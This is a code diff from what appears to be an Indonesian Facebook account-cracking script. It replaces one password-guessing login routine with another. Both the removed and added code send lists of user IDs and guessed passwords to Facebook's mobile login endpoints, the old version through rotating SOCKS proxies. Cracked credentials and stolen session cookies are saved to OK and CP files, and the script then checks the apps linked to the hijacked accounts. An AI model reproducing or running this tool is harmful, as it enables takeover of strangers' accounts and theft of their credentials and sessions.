@@ -992,107 +992,65 @@ def passwrd():
 		Console().print(f"[bold cyan]   	 [bold yellow]God Bye Kawan")
 		time.sleep(2)
 		exit()
+
+
 def methodnew(idf,pwv):
 	global loop,ok,cp
-	bo = random.choice([m,k,h,b,u,x])
-	rr=random.randint
-	auth1='Rudal-XD'
-	ses=requests.Session()
-	prog.update(des,description=f'\r[bold white]new [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{ok}[/] [yellow]CP:[yellow]{cp}')
-	prog.advance(des)
-	ua = random.choice(free)
-	ua2='Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36'
+	ses = requests.Session()
+	ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36'
+	load = random.choice(["😝","😛"])
+	print(f"\r [{H}{load}{P}] {loop}/{len(id)} OK-:{ok} CP-:{cp}",end=" ");sys.stdout.flush()
 	for pw in pwv:
-		pw = pw.lower()
 		try:
-			hst= 'iphone.facebook.com'
-			url= 'https://iphone.facebook.com/login.php?skip_api_login=1&api_key=322935469656730&kid_directed_site=0&app_id=322935469656730&signed_next=1&next=https%3A%2F%2Fiphone.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATCMVytVxs3h0vcwtuRnTboIZVGU1p8q4UHbGllNo8vq2pe5IPqyOfpkf_q1Uq5svpIjq5puNbPyQcIX1pOgaSIl0LKIhrb-8_hFoA-XEpAgEcaXRa5z5eTcn1p1ULhZ-wod-ybV_dypdtHDfRCGTF8nYtaiR6nU9hPmSVLIrxOiYwMHe_VE8ndo8keeolKKGR6i6iBvgiqIbTJogKobqz1fZIR1kagelBP5hTy4VySjsUJQazmiYjrzfH47-dXsHtrcmCjQfIFymBXUSR6XGKU4VQrGJcaN0l6Sgx--dJ965eNC0FSEQR5ohLW7NFzD0nq2QFGVYKUrnNw8Vxfah19oh6pcQDK0gVLEfGr812qeT7ZdV-Ef84p9WYRw9KhS9T6t-Pn0Pk3EQUiQerafL6kzHpe3VoopCDasoXA5H9N_HH-g3KU8LOU4CrvMftgT0cPDszrVUMvI7m0isu5Uz0ipWyZIsHS7jRRNbGVim1agC4WQYwwY_fuMsr8U9SCf-pcRARh7h7785H9dyB5RW7XTnNwHlcPHi2DF7zXWxaHh-Pggjgwr0EqXvrrbT9r2t32iqGYMtPdgV9-st5WZws77tPJF97-WDyLmDg-kduQWUIO8FBstxOBvyvuNJfkXayu_TCLxCmtDlFT_9Rihxv5IY3dmcUg_xYccs0Haq-hCdJu_vx367fg3CXZj5MH1bHbO9730ZvT10I6iK60%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dab649465-fbff-4ead-bd68-1de3ab7f9dcf%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATCMVytVxs3h0vcwtuRnTboIZVGU1p8q4UHbGllNo8vq2pe5IPqyOfpkf_q1Uq5svpIjq5puNbPyQcIX1pOgaSIl0LKIhrb-8_hFoA-XEpAgEcaXRa5z5eTcn1p1ULhZ-wod-ybV_dypdtHDfRCGTF8nYtaiR6nU9hPmSVLIrxOiYwMHe_VE8ndo8keeolKKGR6i6iBvgiqIbTJogKobqz1fZIR1kagelBP5hTy4VySjsUJQazmiYjrzfH47-dXsHtrcmCjQfIFymBXUSR6XGKU4VQrGJcaN0l6Sgx--dJ965eNC0FSEQR5ohLW7NFzD0nq2QFGVYKUrnNw8Vxfah19oh6pcQDK0gVLEfGr812qeT7ZdV-Ef84p9WYRw9KhS9T6t-Pn0Pk3EQUiQerafL6kzHpe3VoopCDasoXA5H9N_HH-g3KU8LOU4CrvMftgT0cPDszrVUMvI7m0isu5Uz0ipWyZIsHS7jRRNbGVim1agC4WQYwwY_fuMsr8U9SCf-pcRARh7h7785H9dyB5RW7XTnNwHlcPHi2DF7zXWxaHh-Pggjgwr0EqXvrrbT9r2t32iqGYMtPdgV9-st5WZws77tPJF97-WDyLmDg-kduQWUIO8FBstxOBvyvuNJfkXayu_TCLxCmtDlFT_9Rihxv5IY3dmcUg_xYccs0Haq-hCdJu_vx367fg3CXZj5MH1bHbO9730ZvT10I6iK60%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr'
-			hdg = {
-				"Vary":"Accept-Encoding",
-				"Content-Encoding":"gzip",
-				"reporting-endpoints":'default="https://iphone.facebook.com/ajax/mtouch_error_reports/?device_level=unknown"',
-				"content-security-policy":"default-src data: blob: 'self' https://*.fbsbx.com 'unsafe-inline' *.facebook.com *.fbcdn.net 'unsafe-eval';script-src *.facebook.com *.fbcdn.net *.facebook.net *.google-analytics.com *.google.com 127.0.0.1:* 'unsafe-inline' blob: data: 'self' connect.facebook.net 'unsafe-eval';style-src fonts.googleapis.com *.fbcdn.net data: *.facebook.com 'unsafe-inline';connect-src *.facebook.com facebook.com *.fbcdn.net *.facebook.net wss://*.facebook.com:* wss://*.whatsapp.com:* wss://*.fbcdn.net attachment.fbsbx.com ws://localhost:* blob: *.cdninstagram.com 'self' http://localhost:3103 wss://gateway.facebook.com wss://edge-chat.facebook.com wss://snaptu-d.facebook.com wss://kaios-d.facebook.com/ v.whatsapp.net *.fbsbx.com *.fb.com;font-src data: *.gstatic.com *.facebook.com *.fbcdn.net *.fbsbx.com;img-src *.fbcdn.net *.facebook.com data: https://*.fbsbx.com *.tenor.co media.tenor.com facebook.com *.cdninstagram.com fbsbx.com fbcdn.net *.giphy.com connect.facebook.net *.carriersignal.info blob: android-webview-video-poster: googleads.g.doubleclick.net www.googleadservices.com *.whatsapp.net *.fb.com *.oculuscdn.com;media-src *.cdninstagram.com blob: *.fbcdn.net *.fbsbx.com www.facebook.com *.facebook.com https://*.giphy.com data:;frame-src *.doubleclick.net *.google.com *.facebook.com www.googleadservices.com *.fbsbx.com fbsbx.com data: www.instagram.com *.fbcdn.net https://paywithmybank.com https://sandbox.paywithmybank.com;worker-src blob: *.facebook.com data:;",
-				"document-policy":"force-load-at-top",
-				"permissions-policy":"accelerometer=(), ambient-light-sensor=(), bluetooth=(), camera=(self), geolocation=(self), gyroscope=(), hid=(), idle-detection=(), magnetometer=(), microphone=(self), midi=(), otp-credentials=(self), payment=(), screen-wake-lock=(), serial=(), usb=()",
-				"cross-origin-resource-policy":"same-origin",
-				"cross-origin-opener-policy":"same-origin-allow-popups",
-				"Pragma":"no-cache",
-				"Cache-Control":"private, no-cache, no-store, must-revalidate",
-				"X-Content-Type-Options":"nosniff",
-				"X-XSS-Protection":"0",
-				"X-Frame-Options":"DENY",
-				"accept-ch-lifetime":"4838400",
-				"accept-ch":"viewport-width,dpr,Sec-CH-Prefers-Color-Scheme,Sec-CH-UA-Full-Version-List,Sec-CH-UA-Platform-Version,Sec-CH-UA-Model",
-				"Content-Type":"text/html; charset=utf-8",
-				"Strict-Transport-Security":"max-age=15552000; preload",
-				"Alt-Svc":'h3=":443";ma=86400',
-				"user-agent": ua,
-				"Transfer-Encoding":"chunked",
-				"Connection":"keep-alive"
-			}
-			hdggg = {
-				'Host': 'iphone.facebook.com',
-				'cache-control': 'max-age=0',
-				'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="115", "Google Chrome";v="115"',
-				'sec-ch-ua-mobile': '?1',
-				'sec-ch-ua-platform': '"Android"',
-				'upgrade-insecure-requests': '1',
-				'origin': 'https://iphone.facebook.com',
-				'content-type': 'application/x-www-form-urlencoded',
-				'user-agent': ua,
-				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-				'sec-fetch-site': 'same-origin',
-				'x-requested-with': 'com.alohamobile.browser.lite',
-				'sec-fetch-mode': 'navigate',
-				'sec-fetch-user': '?1',
-				'sec-fetch-dest': 'document',
-				'referer': f'https://iphone.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',
-				'accept-encoding': 'gzip, deflate, br',
-				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
-			}
-
-			nip=random.choice(prox)
-			proxs= {'http': 'socks4://'+nip}
-			ses.headers.update({'Host': 'iphone.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
-			p = ses.get('https://iphone.facebook.com/login/device-based/password/?uid={idf}&flow=skip_api_login=1&api_key=322935469656730&kid_directed_site=0&app_id=322935469656730&signed_next=1&next=https%3A%2F%2Fiphone.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATCMVytVxs3h0vcwtuRnTboIZVGU1p8q4UHbGllNo8vq2pe5IPqyOfpkf_q1Uq5svpIjq5puNbPyQcIX1pOgaSIl0LKIhrb-8_hFoA-XEpAgEcaXRa5z5eTcn1p1ULhZ-wod-ybV_dypdtHDfRCGTF8nYtaiR6nU9hPmSVLIrxOiYwMHe_VE8ndo8keeolKKGR6i6iBvgiqIbTJogKobqz1fZIR1kagelBP5hTy4VySjsUJQazmiYjrzfH47-dXsHtrcmCjQfIFymBXUSR6XGKU4VQrGJcaN0l6Sgx--dJ965eNC0FSEQR5ohLW7NFzD0nq2QFGVYKUrnNw8Vxfah19oh6pcQDK0gVLEfGr812qeT7ZdV-Ef84p9WYRw9KhS9T6t-Pn0Pk3EQUiQerafL6kzHpe3VoopCDasoXA5H9N_HH-g3KU8LOU4CrvMftgT0cPDszrVUMvI7m0isu5Uz0ipWyZIsHS7jRRNbGVim1agC4WQYwwY_fuMsr8U9SCf-pcRARh7h7785H9dyB5RW7XTnNwHlcPHi2DF7zXWxaHh-Pggjgwr0EqXvrrbT9r2t32iqGYMtPdgV9-st5WZws77tPJF97-WDyLmDg-kduQWUIO8FBstxOBvyvuNJfkXayu_TCLxCmtDlFT_9Rihxv5IY3dmcUg_xYccs0Haq-hCdJu_vx367fg3CXZj5MH1bHbO9730ZvT10I6iK60%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dab649465-fbff-4ead-bd68-1de3ab7f9dcf%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATCMVytVxs3h0vcwtuRnTboIZVGU1p8q4UHbGllNo8vq2pe5IPqyOfpkf_q1Uq5svpIjq5puNbPyQcIX1pOgaSIl0LKIhrb-8_hFoA-XEpAgEcaXRa5z5eTcn1p1ULhZ-wod-ybV_dypdtHDfRCGTF8nYtaiR6nU9hPmSVLIrxOiYwMHe_VE8ndo8keeolKKGR6i6iBvgiqIbTJogKobqz1fZIR1kagelBP5hTy4VySjsUJQazmiYjrzfH47-dXsHtrcmCjQfIFymBXUSR6XGKU4VQrGJcaN0l6Sgx--dJ965eNC0FSEQR5ohLW7NFzD0nq2QFGVYKUrnNw8Vxfah19oh6pcQDK0gVLEfGr812qeT7ZdV-Ef84p9WYRw9KhS9T6t-Pn0Pk3EQUiQerafL6kzHpe3VoopCDasoXA5H9N_HH-g3KU8LOU4CrvMftgT0cPDszrVUMvI7m0isu5Uz0ipWyZIsHS7jRRNbGVim1agC4WQYwwY_fuMsr8U9SCf-pcRARh7h7785H9dyB5RW7XTnNwHlcPHi2DF7zXWxaHh-Pggjgwr0EqXvrrbT9r2t32iqGYMtPdgV9-st5WZws77tPJF97-WDyLmDg-kduQWUIO8FBstxOBvyvuNJfkXayu_TCLxCmtDlFT_9Rihxv5IY3dmcUg_xYccs0Haq-hCdJu_vx367fg3CXZj5MH1bHbO9730ZvT10I6iK60%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
-			req = bs(ses.get(url,headers=hdg,allow_redirects=True).content,'html.parser'); raq = req.find('form',{'method':'post'})
-			data ={
-				"lsd":re.search('name="lsd" type="hidden" value="(.*?)"',str(requ)).group(1),
-				"jazoest":re.search('name="jazoest" type="hidden" value="(.*?)"',str(requ)).group(1),
-				"uid":idf,
-				"next":"https://iphone.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8",
-				"flow":"login_no_pin",
-				"pass":pw,}
-			cookie = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
-			koki+=' m_pixel_ratio=2.625; wd=412x756'
-			next = 'https://iphone.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8'
-			post = requests.Session().post(next,headers=hdg,data=data,cookies=cookie,allow_redirects=False)
-			if "checkpoint" in post.cookies.get_dict().keys():
-				cp+=1
-				print('\n')
-				statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-				statuscp1 = nel(statuscp, width=80, style='bold yellow', title='CP')
-				cetak(statuscp1)
-				os.popen('play-audio c.mp3')
+			if 'ya' in ualuh: ua = ualu[0]
+			mek = random.randint(11,99)
+			link = ses.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8')
+			data = {
+'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
+'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
+'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
+'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
+'try_number': 0,
+'unrecognized_tries': 0,
+'email':idf,
+'pass':pw,
+'login':'Masuk',
+'prefill_contact_point': '',
+'prefill_source': '',
+'prefill_type': '',
+'first_prefill_source': '',
+'first_prefill_type': '',
+'had_cp_prefilled': False,
+'had_password_prefilled': False,
+'is_smart_lock': False,
+'bi_xrwh': 0
+}
+			headers = {'Host': 'mbasic.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
+			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=data,headers=headers,allow_redirects=False)
+			if "checkpoint" in ses.cookies.get_dict().keys():
+				tree = Tree(f" ")
+				tree.add(f"[yellow]Potrait-XD CP").add(f"[yellow]{idf}|{pw}")
+				tree.add(f"[yellow]{ua}\n")
+				cetak(tree)
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
+				cp+=1
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				ok+=1
-				coki=ses.cookies.get_dict()
+				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print('\n')
-				statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-				statusok1 = nel(statusok, width=80, style='bold green', title='OK')
-				cetak(statusok1)
-				os.popen('play-audio o.mp3')
+				tree = Tree(f"  ")
+				tree.add(f"[green]Potrait-XD OK").add(f"[green]{idf}|{pw}")
+				tree.add(f"[purple]{kuki}\n")
+				cetak(tree) 
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+				cek_apk(session,coki)
 				break
-			else:
-				continue
-		except requests.exceptions.ConnectionError:
-			time.sleep(31)
+			else:continue
+		except requests.exceptions.ConnectionError:time.sleep(31)
 	loop+=1
+
 #--------------------[ METODE VALIDATE ]-----------------#
 def _async(idf,pwv):
 	global loop,ok,cp
